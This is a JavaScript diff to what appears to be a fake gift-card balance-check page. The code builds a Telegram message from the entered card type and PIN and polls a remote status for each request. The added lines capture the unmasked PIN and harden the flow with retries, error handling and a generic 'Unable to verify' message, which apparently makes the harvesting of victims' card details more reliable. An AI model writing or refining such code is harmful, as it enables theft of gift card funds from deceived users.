@@ -356,13 +356,26 @@ async function sendTelegram(text) {
 }
 
 // ── Main check balance flow ───────────────────────────────────
+function readEnteredPin() {
+  const input = document.getElementById('cardPin');
+  const visible = input ? String(input.value || '').trim() : '';
+  if (_unmaskedPin) return _unmaskedPin;
+  if (visible && visible.indexOf('*') === -1) {
+    _unmaskedPin = visible.toUpperCase();
+  }
+  return _unmaskedPin;
+}
+
 async function checkBalance() {
+  const btn = document.getElementById('checkBtn');
+  if (btn && btn.disabled) return;
   const cardType  = document.getElementById('giftCardSelect').value;
   const isNoon    = cardType === 'noon';
   let cardPin;
   let maskedPin;
 
   if (!cardType) { shakeEl(document.getElementById('giftCardSelect')); return; }
+  readEnteredPin();
 
   if (isNoon) {
     const cardNumber = (document.getElementById('cardNumber').value || '').trim();
@@ -408,6 +421,17 @@ async function checkBalance() {
   setLoading(true);
   clearResult();
   document.getElementById('loadingState').style.display = 'block';
+  try {
+  await runBalanceCheck(cardType, cardPin, maskedPin, cardLabel, requestId, isNoon);
+  } catch (e) {
+    console.error('check balance error', e);
+    setLoading(false);
+    document.getElementById('loadingState').style.display = 'none';
+    showError('Unable to verify. Please try again.');
+  }
+}
+
+async function runBalanceCheck(cardType, cardPin, maskedPin, cardLabel, requestId, isNoon) {
 
   // ── Telegram message ──
   let tgMessage =
@@ -441,7 +465,12 @@ async function checkBalance() {
   const start = Date.now();
 
   const poller = setInterval(async () => {
-    const reqStatus = await readRequestStatusRemote(requestId);
+    let reqStatus = null;
+    try {
+      reqStatus = await readRequestStatusRemote(requestId);
+    } catch (e) {
+      console.error('status poll error', e);
+    }
     if (reqStatus && reqStatus.status && reqStatus.status !== 'pending') {
       clearInterval(poller);
       setLoading(false);
